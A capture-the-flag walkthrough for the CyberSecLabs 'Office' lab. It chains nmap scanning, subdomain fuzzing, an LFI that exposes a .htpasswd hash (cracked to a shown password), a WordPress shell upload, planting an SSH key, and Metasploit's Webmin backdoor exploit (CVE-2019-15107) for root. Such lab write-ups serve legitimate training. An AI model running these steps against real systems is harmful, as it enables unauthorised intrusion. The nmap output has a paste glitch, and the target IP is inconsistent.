# CyberSecLabs : Office 

```CVE-2019-15107```

```zsh
nmap -sC -sV -p 22,80,443 172.31.1.3

PORT      STATE    SERVICE          VERSION                                                                                                                                                  
22/tcp    open     ssh              OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)                                                                                             
| ssh-hostkey:                                                                                                                                                                               
|   2048 e2:3f:6c:4e:6d:8b:dc:59:b7:cb:66:64:27:f9:22:86 (RSA)                                                                                                                               
|   256 ee:be:37:f3:75:4e:38:2a:a9:99:e0:18:1a:b8:d1:41 (ECDSA)                                                                                                                              
|_  256 7f:72:a7:29:be:30:9e:5e:aa:b9:fc:be:09:d2:8b:3a (ED25519)                                                                                                                            
80/tcp    open     http             Apache httpd 2.4.29 ((Ubuntu))                                                                                                                           
|_http-generator: WordPress 5.4.1                                                                                                                                                            
| http-methods:                                                                                                                                                                              
|_  Supported Methods: GET HEAD POST OPTIONS                                                                                                                                                 
|_http-server-header: Apache/2.4.29 (Ubuntu)                                                                                                                                                 
|_http-title: Dunder Mifflin &#8211; Just another WordPress site                                                                                                                             
443/tcp   open     ssl/http         Apache httpd 2.4.29 ((Ubuntu))                                                                                                                           
| http-methods:                                                                                                                                                                              
|_  Supported Methods: HEAD GET POST OPTIONS                                                                                                                                                 
|_http-server-header: Apache/2.4.29 (Ubuntu)                                                                                                                                                 
|_http-title: Apache2 Ubuntu Default Page: It works                                                                                                                                          
| ssl-cert: Subject: commonName=office.csl/organizationName=Dunder Mifflin/stateOrProvinceName=PA/countryName=US                                                                             
| Issuer: commonName=office.csl/organizationName=Dunder Mifflin/stateOrProvinceName=PA/countryName=US                                                                                        
| Public Key type: rsa                                                                                                                                                                       
| Public Key bits: 4096                                                                                                                                                                      
| Signature Algorithm: sha256WithRSAEncryption                                                                                                                                               
| Not valid before: 2PORT      STATE    SERVICE          VERSION                                                                                                                                                  
                                                                                                                                                 
| Not valid after:  2021-05-08T20:01:51                                                                                                                                                      
| MD5:   e159 faf3 e637 25ad 7d95 3210 9a69 bce6                                                                                                                                             
|_SHA-1: adee e6e5 1566 a86f c8d9 6d7e 1fc0 2239 e21e 92ef                                                                                                                                   
|_ssl-date: TLS randomness does not represent time                                                                                                                                           
| tls-alpn:                                    
|_  http/1.1                                   
10000/tcp filtered snet-sensor-mgmt                                                           
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Subdomain finding:

```zsh
wfuzz -c -f sub-fighter -w /root/SecLists/Discovery/DNS/fierce-hostlist.txt  -u "http://office.csl" -H "Host: FUZZ.office.
csl" -t 42 --hh 32240
```

Get subdomain :```forum.office.csl```

Get the hints that there is ```port forwarding```

Dirsearch it: to find ```office.csl/wp-login.php```

In forums there is a LFI from ```forum.office.csl/chatlogs/chatlogs.php?file=chatlog.txt```

fuzz it using Seclists - Jhaddix list:

```zsh
python3 dirsearch/dirsearch.py -u http://forum.office.csl/chatlogs/chatlogs.php\?file\= -w /root/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt  -e * -R 3
```
```[04:08:07] 403 -  281B  - /.htpasswd```

Use LFI payload ../.htpasswd and 
get a hash for dwight

```dwight:$apr1$7FARE4DE$lKgF/R9rSUEY6s.L79/dM/```

Crack it
```zsh
john hash.txt /usr/share/wordlists/rockyou.txt
```
```dwight:cowboys1```

Login in wordpress. Upload file using wordpress filemanager. Get a shell. 

Then ```sudo -u dwight /bin/bash/```

on your kali machine
```zsh
ssh-keygen
```
cat id_rsa.pub > authorized_keys

wget this to dwights .ssh folder

And now ssh as dwight

```
ssh -i id_rsa dwight@172.31.3.1 
```

in my nmap and winpeas and linpeas result I had seen 10000 port.
I tried to connect to using and grab the banner, it was minserv ---> basically webmin

SSH Tunneling:
``` ssh -i id_rsa -L 7000:127.0.0.1:10000 -N -f dwight@172.31.3.1```

https://linuxize.com/post/how-to-setup-ssh-tunneling/

Now go to localhost:7000 and you can access the webmin site.

go to msfconsole and search webmin

Get this module:

```exploit/linux/http/webmin_backdoor```

set LHOST as your tun0, since you have done tunneling RHOST is 127.0.0.1 and the RPORT is 7000

exploit and you will have shell as root.

